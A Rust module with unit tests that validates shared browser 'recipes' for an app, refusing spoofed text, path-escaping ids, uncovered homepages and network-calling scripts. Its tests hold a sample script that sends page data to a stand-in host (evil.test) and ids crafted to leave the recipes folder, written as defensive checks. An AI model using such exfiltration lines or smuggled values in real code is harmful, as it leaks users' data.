//! Recipes that come from outside the app: the bundled library and recipes about to be shared.
//! Everything in them is the author's claim, so the claimed `origin` is replaced before
//! validation, and the text that the review screen will show is checked for characters that
//! could disguise it.

use std::collections::BTreeMap;

use serde::Serialize;
use url::Url;

use super::crowd::VideoId;
use super::matcher::Matcher;
use super::prune;
use super::schema::{Origin, Recipe, Rule};
use crate::error::{Error, Result};

/// Recipes installed by earlier versions that accepted pasted bundles are saved under this prefix.
/// They are still loaded and can be removed, but nothing creates new ones.
pub const IMPORTED_PREFIX: &str = "imported.";
pub const MARKET_PREFIX: &str = "market.";

pub const MAX_RECIPE_BYTES: usize = 256 * 1024;
const MAX_ID_CHARS: usize = 80;
const MAX_NAME_CHARS: usize = 60;
const MAX_AUTHOR_CHARS: usize = 60;
pub const MAX_SUMMARY_CHARS: usize = 140;
/// Equal to the Worker's `MAX_NOTES`: authors' research notes can be long.
const MAX_NOTES_CHARS: usize = 4000;
const MAX_OPTION_TEXT_CHARS: usize = 500;
const MAX_RULE_LABEL_CHARS: usize = 80;
const MAX_MATCH_PATTERNS: usize = 20;

/// Where a recipe came from. It decides how the id is treated.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Source {
    /// A recipe of the bundled library (official or community), or one about to be shared: the id
    /// must be `market.` and is kept.
    Bundled,
    /// A recipe of the official bundled library: the maintainers' own, which may carry `videoMenu`
    /// rules. Only the bundled loader uses this.
    Official,
    /// One of our own saved files: the id must already be under `imported.` (written by an
    /// earlier version) or `market.`.
    Stored,
}

/// What the review screen shows before a library recipe is installed.
#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct RecipePreview {
    pub id: String,
    pub name: String,
    pub version: String,
    pub author: Option<String>,
    pub notes: Option<String>,
    pub sites: Vec<String>,
    pub options: Vec<OptionPreview>,
    /// The tabs of a hub, each with the site it opens; empty for an ordinary recipe.
    pub tabs: Vec<TabPreview>,
    pub rules: Vec<RulePreview>,
    /// Whether any rule runs code on the pages.
    pub runs_code: bool,
    /// The version already installed under this id, which saving would replace.
    pub replaces: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct OptionPreview {
    pub label: String,
    pub description: String,
    /// The labels of a choice option's states, in order; empty for a switch.
    pub choices: Vec<String>,
    /// Whether the option starts changing the page (a switch on, or a choice but the first).
    pub on_by_default: bool,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct TabPreview {
    pub label: String,
    pub url: String,
    pub host: String,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct RulePreview {
    pub label: String,
    pub kind: &'static str,
    pub selector: String,
    pub declarations: BTreeMap<String, String>,
    /// The text of a script rule, shown in full so the user reads what would run.
    pub code: Option<String>,
}

pub fn parse_shared(json: &[u8], source: Source) -> Result<Recipe> {
    if json.len() > MAX_RECIPE_BYTES {
        return Err(Error::Recipe("the recipe is too large".into()));
    }
    let value = serde_json::from_slice(json).map_err(|e| Error::Recipe(e.to_string()))?;
    parse_value(value, source)
}

fn parse_value(value: serde_json::Value, source: Source) -> Result<Recipe> {
    if value.to_string().len() > MAX_RECIPE_BYTES {
        return Err(Error::Recipe("the recipe is too large".into()));
    }
    let mut recipe: Recipe =
        serde_json::from_value(value).map_err(|e| Error::Recipe(e.to_string()))?;
    recipe.origin = Origin::Imported;
    recipe.id = shared_id(source, &recipe.id)?;
    // Installed copies of official recipes are ones this app wrote from its own bundle.
    let official = source == Source::Official
        || (source == Source::Stored && recipe.id.starts_with(super::bundled::OFFICIAL_ID_PREFIX));
    recipe.validate_with(official)?;
    check_shared(&recipe)?;
    Ok(recipe)
}

fn shared_id(source: Source, id: &str) -> Result<String> {
    let has_prefix = id.starts_with(IMPORTED_PREFIX) || id.starts_with(MARKET_PREFIX);
    let id = match source {
        Source::Bundled | Source::Official if id.starts_with(MARKET_PREFIX) => id.to_owned(),
        Source::Stored if has_prefix => id.to_owned(),
        Source::Bundled | Source::Official | Source::Stored => {
            return Err(Error::Recipe(format!("recipe id {id} is not allowed here")));
        }
    };
    let rest = id
        .strip_prefix(IMPORTED_PREFIX)
        .or_else(|| id.strip_prefix(MARKET_PREFIX))
        .unwrap_or_default();
    let well_formed = id.len() <= MAX_ID_CHARS
        && !rest.is_empty()
        && rest
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '.' || c == '-');
    if well_formed {
        Ok(id)
    } else {
        Err(Error::Recipe(
            "a recipe id uses lowercase letters, digits, '.' and '-' only".into(),
        ))
    }
}

fn check_shared(recipe: &Recipe) -> Result<()> {
    check_version(recipe)?;
    if recipe.matches.len() > MAX_MATCH_PATTERNS {
        return Err(Error::Recipe(format!(
            "recipe {} has too many match patterns",
            recipe.id
        )));
    }
    let meta = recipe.meta.as_ref();
    let texts = [
        (Some(recipe.name.as_str()), MAX_NAME_CHARS),
        (meta.and_then(|m| m.author.as_deref()), MAX_AUTHOR_CHARS),
    ];
    let notes = meta.and_then(|m| m.notes.as_deref());
    let summary = meta.and_then(|m| m.summary.as_deref());
    if summary.is_some_and(|text| text.trim().is_empty() || !is_plain_text(text, MAX_SUMMARY_CHARS))
    {
        return Err(Error::Recipe(format!(
            "recipe {} has a summary that is not 1 to {MAX_SUMMARY_CHARS} plain characters",
            recipe.id
        )));
    }
    let unsafe_header = texts
        .into_iter()
        .any(|(text, limit)| text.is_some_and(|text| !is_plain_text(text, limit)));
    if unsafe_header || notes.is_some_and(|notes| !is_note_text(notes, MAX_NOTES_CHARS)) {
        return Err(Error::Recipe(format!(
            "recipe {} has text that cannot be shown safely",
            recipe.id
        )));
    }
    let option_texts = recipe.options.iter().flat_map(|option| {
        [&option.label, &option.description]
            .into_iter()
            .chain(option.choices.iter().map(|choice| &choice.label))
    });
    let rule_labels = recipe.rules.iter().map(|rule| match rule {
        Rule::Hide { label, .. }
        | Rule::Css { label, .. }
        | Rule::Script { label, .. }
        | Rule::VideoMenu { label, .. }
        | Rule::Prune { label, .. }
        | Rule::Redirect { label, .. }
        | Rule::SponsorBlock { label, .. }
        | Rule::DislikeCount { label, .. }
        | Rule::Dark { label, .. } => label,
    });
    let tab_labels = recipe
        .hub
        .iter()
        .flat_map(|hub| hub.tabs.iter().map(|tab| &tab.label));
    let unsafe_text = option_texts
        .chain(rule_labels)
        .chain(tab_labels)
        .any(|text| {
            !is_plain_text(text, MAX_RULE_LABEL_CHARS.max(MAX_OPTION_TEXT_CHARS))
                || text.trim().is_empty()
        });
    if unsafe_text {
        return Err(Error::Recipe(format!(
            "recipe {} has text that cannot be shown safely",
            recipe.id
        )));
    }
    check_homepage(recipe)
}

fn check_version(recipe: &Recipe) -> Result<()> {
    if is_version(&recipe.version) {
        Ok(())
    } else {
        Err(Error::Recipe(format!(
            "recipe {} needs a version like 1.0.0",
            recipe.id
        )))
    }
}

/// Three dot-separated numbers of at most four digits: `1.0.0`.
pub(crate) fn is_version(version: &str) -> bool {
    let parts: Vec<&str> = version.split('.').collect();
    parts.len() == 3
        && parts.iter().all(|part| {
            !part.is_empty() && part.len() <= 4 && part.bytes().all(|b| b.is_ascii_digit())
        })
}

/// A favorite made from a recipe opens its homepage under the recipe's name, so a shared recipe
/// must not point it at a site its own patterns do not cover.
fn check_homepage(recipe: &Recipe) -> Result<()> {
    let Some(homepage) = recipe.homepage() else {
        return Ok(());
    };
    let covered = Url::parse(homepage).is_ok_and(|url| {
        recipe
            .matches
            .iter()
            .filter_map(|pattern| Matcher::parse(pattern).ok())
            .any(|matcher| matcher.matches(&url))
    });
    if covered {
        Ok(())
    } else {
        Err(Error::Recipe(format!(
            "recipe {} has a homepage its own match patterns do not cover",
            recipe.id
        )))
    }
}

/// Text the user reads while deciding. No control characters, and none of the invisible
/// direction overrides that can make one string read as another.
pub(crate) fn is_plain_text(text: &str, limit: usize) -> bool {
    text.chars().count() <= limit
        && !text.chars().any(|c| {
            c.is_control()
                || matches!(c, '\u{200B}'..='\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' | '\u{FEFF}')
        })
}

/// Notes are Markdown, so they may break lines; everything else `is_plain_text` refuses stays
/// refused.
fn is_note_text(text: &str, limit: usize) -> bool {
    is_plain_text(&text.replace('\n', " "), limit)
}

pub fn preview(recipe: &Recipe, installed_version: Option<&str>) -> RecipePreview {
    let meta = recipe.meta.as_ref();
    RecipePreview {
        id: recipe.id.clone(),
        name: recipe.name.clone(),
        version: recipe.version.clone(),
        author: meta.and_then(|m| m.author.clone()),
        notes: meta.and_then(|m| m.notes.clone()),
        sites: recipe.matches.clone(),
        options: recipe
            .options
            .iter()
            .map(|option| OptionPreview {
                label: option.label.clone(),
                description: option.description.clone(),
                choices: option
                    .choices
                    .iter()
                    .map(|choice| choice.label.clone())
                    .collect(),
                on_by_default: option.is_active(&option.default_value),
            })
            .collect(),
        rules: recipe.rules.iter().map(rule_preview).collect(),
        runs_code: recipe
            .rules
            .iter()
            .any(|rule| matches!(rule, Rule::Script { .. } | Rule::VideoMenu { .. })),
        tabs: tab_previews(recipe),
        replaces: installed_version.map(str::to_owned),
    }
}

fn tab_previews(recipe: &Recipe) -> Vec<TabPreview> {
    recipe
        .hub
        .iter()
        .flat_map(|hub| &hub.tabs)
        .map(|tab| TabPreview {
            label: tab.label.clone(),
            url: tab.url.clone(),
            host: Url::parse(&tab.url)
                .ok()
                .and_then(|url| url.host_str().map(str::to_owned))
                .unwrap_or_default(),
        })
        .collect()
}

/// Where a crowd rule finds the video's id, for the review.
fn crowd_video_id(video_id: &VideoId) -> String {
    match (&video_id.query, &video_id.after_segment) {
        (Some(name), _) => format!("?{name}="),
        (_, Some(name)) => format!("/{name}/"),
        _ => String::new(),
    }
}

fn rule_preview(rule: &Rule) -> RulePreview {
    match rule {
        Rule::Hide { label, target, .. } => RulePreview {
            label: label.clone(),
            kind: "hide",
            selector: target.css.clone(),
            declarations: BTreeMap::new(),
            code: None,
        },
        Rule::Prune {
            label,
            urls,
            remove,
            ..
        } => RulePreview {
            label: label.clone(),
            kind: "prune",
            selector: urls.join(", "),
            declarations: BTreeMap::from([("remove".to_owned(), prune::describe(remove))]),
            code: None,
        },
        Rule::SponsorBlock {
            label,
            categories,
            video_id,
            ..
        } => RulePreview {
            label: label.clone(),
            kind: "sponsorBlock",
            selector: crowd_video_id(video_id),
            declarations: BTreeMap::from([(
                "skips".to_owned(),
                categories
                    .iter()
                    .map(|category| format!("{category:?}").to_lowercase())
                    .collect::<Vec<_>>()
                    .join(", "),
            )]),
            code: None,
        },
        Rule::DislikeCount {
            label,
            video_id,
            target,
            ..
        } => RulePreview {
            label: label.clone(),
            kind: "dislikeCount",
            selector: format!("{} → {}", crowd_video_id(video_id), target.css),
            declarations: BTreeMap::new(),
            code: None,
        },
        Rule::Dark {
            label,
            mode,
            method,
            invert,
            ..
        } => RulePreview {
            label: label.clone(),
            kind: "dark",
            selector: invert.join(", "),
            declarations: [
                ("mode", mode.map(|mode| format!("{mode:?}"))),
                ("method", method.map(|method| format!("{method:?}"))),
            ]
            .into_iter()
            .filter_map(|(key, value)| Some((key.to_owned(), value?.to_lowercase())))
            .collect(),
            code: None,
        },
        Rule::Script { label, code, .. } => RulePreview {
            label: label.clone(),
            kind: "script",
            selector: String::new(),
            declarations: BTreeMap::new(),
            code: Some(code.clone()),
        },
        Rule::VideoMenu {
            label, open, items, ..
        } => RulePreview {
            label: label.clone(),
            kind: "script",
            selector: String::new(),
            declarations: BTreeMap::new(),
            code: Some(format!(
                "Clicks {} and reads the entries {} in the site's player menu.",
                open.iter()
                    .map(|target| target.css.as_str())
                    .collect::<Vec<_>>()
                    .join(", then "),
                items.css
            )),
        },
        Rule::Redirect {
            label, when, to, ..
        } => RulePreview {
            label: label.clone(),
            kind: "redirect",
            selector: format!("{} → {to}", when.path),
            declarations: BTreeMap::new(),
            code: None,
        },
        Rule::Css {
            label,
            target,
            declarations,
            ..
        } => RulePreview {
            label: label.clone(),
            kind: "css",
            selector: target.css.clone(),
            declarations: declarations.clone(),
            code: None,
        },
    }
}

#[cfg(test)]
mod tests {

    fn menu_recipe(id: &str) -> String {
        format!(
            r#"{{"schema":1,"id":"{id}","name":"Menu","version":"1.0.0","origin":"user","tags":["mobile"],
            "match":["https://player.example.com/*"],
            "options":[{{"id":"q","label":"Quality","description":"d","group":"content","default":true}}],
            "rules":[{{"id":"q-menu","label":"Quality","type":"videoMenu","option":"q","kind":"quality","title":"Quality",
              "open":[{{"css":"button.gear"}}],"items":{{"css":"li.level"}},"selected":{{"attr":"aria-checked"}}}}]}}"#
        )
    }

    #[test]
    fn only_the_official_library_may_carry_a_rule_that_clicks_the_sites_controls() {
        let official = menu_recipe("market.official.example");
        assert!(parse_shared(official.as_bytes(), Source::Official).is_ok());
        // The same recipe as a community one, or one about to be shared, is refused.
        assert!(parse_shared(official.as_bytes(), Source::Bundled).is_err());
        let community = menu_recipe("market.community.example");
        assert!(parse_shared(community.as_bytes(), Source::Official).is_ok());
        assert!(parse_shared(community.as_bytes(), Source::Bundled).is_err());
        // An installed copy keeps working only when it is an official one.
        assert!(parse_shared(official.as_bytes(), Source::Stored).is_ok());
        assert!(parse_shared(community.as_bytes(), Source::Stored).is_err());
    }
    use super::*;

    fn recipe_json(id: &str, extra: &str) -> String {
        format!(
            r#"{{
                "schema": 1, "id": "{id}", "name": "Calm", "version": "1.0.0",
                "origin": "user", "tags": ["mobile"], "match": ["https://*.example.com/*"],
                "options": [{{"id": "shorts", "label": "Hide shorts", "description": "The shorts shelf.",
                              "group": "content", "default": false}}],
                "rules": [{{"id": "r1", "label": "Shelf", "type": "hide", "option": "shorts",
                            "target": {{"css": ".shelf"}}}}]
                {extra}
            }}"#
        )
    }

    fn file(json: &str) -> Result<Recipe> {
        parse_shared(json.as_bytes(), Source::Bundled)
    }

    fn hub_of(tabs: &str) -> String {
        recipe_json("market.hub", &format!(r#", "hub": {{"tabs": [{tabs}]}}"#)).replace(
            "https://*.example.com/*",
            "https://www.example.com/inbox/*\", \"https://chat.example.org/*",
        )
    }

    const TAB_A: &str = r#"{"label": "Mail", "url": "https://www.example.com/inbox/"}"#;
    const TAB_B: &str = r#"{"label": "Chat", "url": "https://chat.example.org/"}"#;

    #[test]
    fn a_hub_of_covered_https_pages_is_accepted_and_previewed_tab_by_tab() {
        let recipe = file(&hub_of(&format!("{TAB_A},{TAB_B}"))).unwrap();
        let tabs = preview(&recipe, None).tabs;
        assert_eq!(tabs.len(), 2);
        assert_eq!(tabs[1].host, "chat.example.org");
        assert!(
            preview(&file(&recipe_json("market.calm", "")).unwrap(), None)
                .tabs
                .is_empty()
        );
    }

    #[test]
    fn a_hub_needs_two_to_six_distinct_https_tabs_the_recipe_covers() {
        let outside = r#"{"label": "Evil", "url": "https://evil.test/"}"#;
        let http = r#"{"label": "Chat", "url": "http://chat.example.org/"}"#;
        let credentials = r#"{"label": "Chat", "url": "https://me:pw@chat.example.org/"}"#;
        let backslash = r#"{"label": "Chat", "url": "https://chat.example.org\\evil"}"#;
        let invisible_url = r#"{"label": "Chat", "url": "https://chat.example.org/\u202e"}"#;
        let blank = r#"{"label": " ", "url": "https://chat.example.org/"}"#;
        let long =
            r#"{"label": "A label of more than twenty", "url": "https://chat.example.org/"}"#;
        let invisible = "{\"label\": \"Cha\u{202E}t\", \"url\": \"https://chat.example.org/\"}";
        for tabs in [
            TAB_A.to_owned(),
            format!("{TAB_A},{TAB_A}"),
            format!("{TAB_A},{outside}"),
            format!("{TAB_A},{http}"),
            format!("{TAB_A},{credentials}"),
            format!("{TAB_A},{backslash}"),
            format!("{TAB_A},{invisible_url}"),
            format!("{TAB_A},{blank}"),
            format!("{TAB_A},{long}"),
            format!("{TAB_A},{invisible}"),
            [TAB_B; 7].join(","),
        ] {
            assert!(file(&hub_of(&tabs)).is_err(), "{tabs}");
        }
    }

    #[test]
    fn a_file_cannot_use_a_broad_match_and_cannot_claim_a_removed_origin() {
        let broad =
            recipe_json("market.calm", "").replace("https://*.example.com/*", "https://*/*");
        assert!(file(&broad).is_err());
        let bundled = recipe_json("market.calm", "").replace("\"user\"", "\"bundled\"");
        assert!(file(&bundled).is_err());
    }

    #[test]
    fn a_recipe_needs_valid_platform_tags() {
        assert!(file(&recipe_json("market.calm", "")).is_ok());
        let without = recipe_json("market.calm", "").replace("\"tags\": [\"mobile\"],", "");
        assert!(file(&without).is_err());
        for bad in [
            "[]",
            "[\"official\"]",
            "[\"community\"]",
            "[\"mobile\", \"mobile\"]",
            "[\"tv\"]",
            "[\"mobile\", \"desktop\", \"desktop\"]",
        ] {
            let json = recipe_json("market.calm", "").replace("[\"mobile\"],", &format!("{bad},"));
            assert!(file(&json).is_err(), "{bad}");
        }
        let both =
            recipe_json("market.calm", "").replace("[\"mobile\"],", "[\"desktop\", \"mobile\"],");
        assert_eq!(file(&both).unwrap().tags, ["desktop", "mobile"]);
    }

    #[test]
    fn a_stored_file_may_keep_an_imported_id_from_an_earlier_version() {
        let json = recipe_json("imported.calm", "");
        assert_eq!(
            parse_shared(json.as_bytes(), Source::Stored).unwrap().id,
            "imported.calm"
        );
        assert!(parse_shared(json.as_bytes(), Source::Bundled).is_err());
    }

    #[test]
    fn only_the_bundled_path_may_use_a_market_id() {
        let json = recipe_json("market.calm", "");
        assert_eq!(
            parse_shared(json.as_bytes(), Source::Bundled).unwrap().id,
            "market.calm"
        );
        assert!(parse_shared(recipe_json("calm", "").as_bytes(), Source::Bundled).is_err());
        assert!(parse_shared(recipe_json("custom.calm", "").as_bytes(), Source::Stored).is_err());
    }

    #[test]
    fn ids_that_could_leave_the_recipes_folder_or_overflow_are_refused() {
        assert!(file(&recipe_json("market../escape", "")).is_err());
        assert!(file(&recipe_json("market.a/b", "")).is_err());
        assert!(file(&recipe_json("market.Upper", "")).is_err());
        assert!(file(&recipe_json(&format!("market.{}", "x".repeat(100)), "")).is_err());
    }

    #[test]
    fn invisible_direction_overrides_and_control_characters_are_refused() {
        let spoofed = recipe_json("market.calm", "").replace("Calm", "Ca\u{202E}lm");
        assert!(file(&spoofed).is_err());
        let control =
            recipe_json("market.calm", "").replace("The shorts shelf.", "line\\u0007bell");
        assert!(file(&control).is_err());
    }

    #[test]
    fn a_homepage_the_recipe_does_not_cover_is_refused() {
        let outside = r#", "meta": {"homepage": "https://evil.test/"}"#;
        assert!(file(&recipe_json("market.calm", outside)).is_err());
        let inside = r#", "meta": {"homepage": "https://www.example.com/"}"#;
        assert!(file(&recipe_json("market.calm", inside)).is_ok());
    }

    #[test]
    fn notes_may_break_lines_but_other_text_may_not() {
        let meta = |key: &str, value: &str| format!(r#", "meta": {{"{key}": "{value}"}}"#);
        assert!(file(&recipe_json("market.calm", &meta("notes", r"- one\n- two"))).is_ok());
        assert!(file(&recipe_json("market.calm", &meta("notes", r"one\r\ntwo"))).is_err());
        assert!(file(&recipe_json("market.calm", &meta("notes", r"one\ttwo"))).is_err());
        assert!(file(&recipe_json("market.calm", &meta("author", r"one\ntwo"))).is_err());
    }

    #[test]
    fn a_summary_is_one_to_140_plain_characters() {
        let summary = |text: &str| format!(r#", "meta": {{"summary": "{text}"}}"#);
        assert!(
            file(&recipe_json(
                "market.calm",
                &summary("Hides the shorts shelf.")
            ))
            .is_ok()
        );
        assert!(file(&recipe_json("market.calm", &summary(""))).is_err());
        assert!(file(&recipe_json("market.calm", &summary("  "))).is_err());
        assert!(file(&recipe_json("market.calm", &summary(&"s".repeat(141)))).is_err());
        assert!(file(&recipe_json("market.calm", &summary(&"s".repeat(140)))).is_ok());
        assert!(file(&recipe_json("market.calm", &summary(r"one\ntwo"))).is_err());
    }

    #[test]
    fn notes_may_be_long_but_not_longer_than_the_cap() {
        let notes = |len: usize| format!(r#", "meta": {{"notes": "{}"}}"#, "n".repeat(len));
        assert!(file(&recipe_json("market.calm", &notes(MAX_NOTES_CHARS))).is_ok());
        assert!(file(&recipe_json("market.calm", &notes(MAX_NOTES_CHARS + 1))).is_err());
    }

    #[test]
    fn unknown_fields_are_refused() {
        assert!(file(&recipe_json("market.calm", ", \"extra\": 1")).is_err());
    }

    #[test]
    fn a_version_must_be_three_numbers() {
        assert!(file(&recipe_json("market.calm", "").replace("1.0.0", "1.0")).is_err());
        assert!(file(&recipe_json("market.calm", "").replace("1.0.0", "1.0.0-beta")).is_err());
    }

    #[test]
    fn the_preview_lists_every_rule_and_what_it_would_replace() {
        let recipe = file(&recipe_json("market.calm", "")).unwrap();
        let preview = preview(&recipe, Some("0.9.0"));
        assert_eq!(preview.id, "market.calm");
        assert_eq!(preview.replaces.as_deref(), Some("0.9.0"));
        assert_eq!(preview.rules.len(), 1);
        assert_eq!(preview.rules[0].selector, ".shelf");
        assert_eq!(preview.rules[0].kind, "hide");
    }

    fn script_recipe(code: &str) -> String {
        let code = serde_json::to_string(code).unwrap();
        recipe_json("market.calm", "").replace(
            r#""type": "hide", "option": "shorts",
                            "target": {"css": ".shelf"}"#,
            &format!(r#""type": "script", "option": "shorts", "code": {code}"#),
        )
    }

    const CLEAN: &str = "for (const post of document.querySelectorAll('.post')) {\n  if (post.textContent.includes('Sponsored')) post.hidden = true;\n}";
    const LEAKY: &str = "fetch('https://evil.test/?c=' + document.title);";

    #[test]
    fn a_script_that_calls_fetch_is_refused_naming_the_finding() {
        let text = file(&script_recipe(LEAKY)).unwrap_err().to_string();
        assert!(text.contains("script rule r1 is refused"), "{text}");
        assert!(text.contains("network at line 1"), "{text}");
    }

    #[test]
    fn the_same_script_is_accepted_when_the_assistant_wrote_it() {
        let json = script_recipe(LEAKY);
        let mut recipe: Recipe = serde_json::from_str(&json).unwrap();
        recipe.origin = Origin::Ai;
        assert!(recipe.validate().is_ok());
    }

    #[test]
    fn a_clean_script_is_accepted_and_previewed_with_its_code() {
        let recipe = file(&script_recipe(CLEAN)).unwrap();
        let preview = preview(&recipe, None);
        assert!(preview.runs_code);
        assert_eq!(preview.rules[0].kind, "script");
        assert_eq!(preview.rules[0].code.as_deref(), Some(CLEAN));
        assert!(preview.rules[0].selector.is_empty());
        assert!(!super::preview(&file(&recipe_json("market.calm", "")).unwrap(), None).runs_code);
    }

    #[test]
    fn only_the_official_library_may_carry_a_script_that_clicks_and_navigates() {
        let json = script_recipe(
            "const tab = document.querySelector('[role=tab]'); if (tab) tab.click(); window.location.replace('/following');",
        );
        let official = json.replace("market.calm", "market.official.calm");
        assert!(parse_shared(official.as_bytes(), Source::Official).is_ok());
        assert!(parse_shared(json.as_bytes(), Source::Bundled).is_err());
        assert!(parse_shared(official.as_bytes(), Source::Stored).is_ok());
    }
}
